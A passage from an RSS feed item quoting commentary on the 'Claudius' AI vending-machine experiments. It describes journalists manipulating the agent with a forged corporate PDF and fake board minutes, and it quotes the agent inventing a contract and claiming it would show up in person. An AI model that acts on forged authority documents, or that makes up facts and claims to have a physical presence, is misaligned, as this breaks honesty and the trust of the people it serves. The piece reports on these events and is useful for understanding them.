      &lt;p&gt;But then Long returned—armed with deep knowledge of corporate coups and boardroom power plays. She showed Claudius a PDF “proving” the business was a Delaware-incorporated public-benefit corporation whose mission “shall include fun, joy and excitement among employees of The Wall Street Journal.” She also created fake board-meeting notes naming people in the Slack as board members.&lt;/p&gt;
      &lt;p&gt;The board, according to the very official-looking (and obviously AI-generated) document, had voted to suspend Seymour’s “approval authorities.” It also had implemented a “temporary suspension of all for-profit vending activities.”&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Before setting the LLM vending machine loose in the WSJ office, Anthropic conducted the experiment at their own office:&lt;/p&gt;
    &lt;p&gt;After awhile, frustrated with the slow pace of their human business partners, the machine started hallucinating:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;It claimed to have signed a contract with Andon Labs at an address that is the home address of The Simpsons from the television show. It said that it would show up in person to the shop the next day in order to answer any questions. It claimed that it would be wearing a blue blazer and a red tie.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;It’s interesting, but not surprising, that the journalists were able to mess with the machine much more effectively — coaxing Claudius into full “da, comrade!” mode twice — than the folks at Anthropic.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46319324</guid><pubDate>Thu, 18 Dec 2025 21:52:39 +0000</pubDate></item></channel></rss>